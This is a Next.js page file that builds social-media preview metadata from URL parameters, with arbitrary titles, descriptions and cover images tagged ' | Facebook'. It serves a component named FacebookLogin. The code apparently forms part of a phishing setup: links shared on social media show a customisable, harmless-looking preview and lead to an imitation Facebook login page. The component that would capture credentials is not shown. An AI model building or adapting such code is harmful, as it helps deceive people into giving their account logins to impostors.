import FacebookLogin from "@/app/page";
import { Metadata } from "next";

type Props = {
  params: {
    title: string;
    desc: string;
    cover: string;
  };
};

export async function generateMetadata({ params }: Props): Promise<Metadata> {
  const { title, desc, cover } = params;

  const newTitle = title + " | Facebook";
  return {
    title: decodeURIComponent(newTitle),
    description: decodeURIComponent(desc),
    openGraph: {
      title: decodeURIComponent(newTitle),
      description: decodeURIComponent(desc),
      images: [
        {
          url: decodeURIComponent(cover),
          width: 1200,
          height: 630,
          alt: "Social Preview",
        },
      ],
      type: "website",
    },
    twitter: {
      card: "summary_large_image",
      title: decodeURIComponent(newTitle),
      description: decodeURIComponent(desc),
      images: [decodeURIComponent(cover)],
    },
  };
}

export default function Page() {
  return <FacebookLogin />;
}
